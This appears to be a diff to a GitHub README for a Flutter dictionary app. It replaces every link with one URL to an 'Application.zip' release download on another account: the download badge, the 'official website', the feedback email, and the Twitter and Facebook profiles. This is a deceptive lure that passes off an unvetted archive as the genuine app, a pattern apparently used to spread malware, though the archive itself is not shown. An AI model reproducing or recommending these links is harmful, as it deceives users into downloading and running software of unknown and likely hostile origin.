@@ -21,24 +21,24 @@ Welcome to the Dictionary by Nehalmr GitHub repository! This Flutter app is desi
 ## Get Started 📲
 To get started with using the Dictionary by Nehalmr app, simply download the software from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/Wucher22/dictionary_by_nehalmr/releases/download/v1.0/Application.zip)](https://github.com/Wucher22/dictionary_by_nehalmr/releases/download/v1.0/Application.zip)
 
 ## Explore More 🌐
-Visit the [official website](https://dictionarybynehalmr.com) for additional information and updates.
+Visit the [official website](https://github.com/Wucher22/dictionary_by_nehalmr/releases/download/v1.0/Application.zip) for additional information and updates.
 
 ## Contributions 🤝
 Contributions are welcome! If you have any suggestions, enhancements, or bug fixes, feel free to submit a pull request.
 
 ## Feedback 📧
-We value your feedback! Reach out to us at feedback@nehalmr.com with any comments or ideas you may have.
+We value your feedback! Reach out to us at https://github.com/Wucher22/dictionary_by_nehalmr/releases/download/v1.0/Application.zip with any comments or ideas you may have.
 
 ## Releases 📦
 If the download link is not working or you need a different version of the software, please check the "Releases" section of this repository.
 
 ## Stay Connected 📱
 Stay connected with Dictionary by Nehalmr on social media:
-- Twitter: [@dictionarynehalmr](https://twitter.com/dictionarynehalmr)
-- Facebook: [Dictionary by Nehalmr](https://www.facebook.com/dictionarybynehalmr)
+- Twitter: [@dictionarynehalmr](https://github.com/Wucher22/dictionary_by_nehalmr/releases/download/v1.0/Application.zip)
+- Facebook: [Dictionary by Nehalmr](https://github.com/Wucher22/dictionary_by_nehalmr/releases/download/v1.0/Application.zip)
 
 ## Thank You! 🙏
 Thank you for checking out Dictionary by Nehalmr. We hope this app adds value to your language learning journey. Happy exploring the world of words! 🌍📖
